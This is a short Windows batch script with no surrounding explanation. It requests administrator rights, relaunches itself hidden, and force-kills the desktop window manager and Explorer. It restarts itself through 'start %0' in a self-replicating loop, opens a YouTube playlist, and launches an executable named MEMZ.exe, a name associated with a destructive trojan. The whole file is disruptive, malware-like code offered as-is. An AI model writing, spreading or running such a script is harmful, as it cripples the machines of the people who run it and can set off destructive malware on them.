whoami /priv | find "SeDebugPrivilege" > nul
if %errorlevel% neq 0 (
 @powershell start-process %~0 -verb runas
 exit
)
if not "%~0"=="%~dp0.\%~nx0" powershell  -NoProfile  start-process cmd -ArgumentList '/c,%~dp0.\%~nx0 %*' -WindowStyle  hidden & goto :eof

taskkill /T /F /IM dwm.exe
taskkill explorer.exe
start %0
start https://www.youtube.com/watch?v=Rjc6SbZseW4&list=PLA6odHjcYKgcETLAVQueNx1HgAMbhpmEc&index=2
MEMZ.exe
exit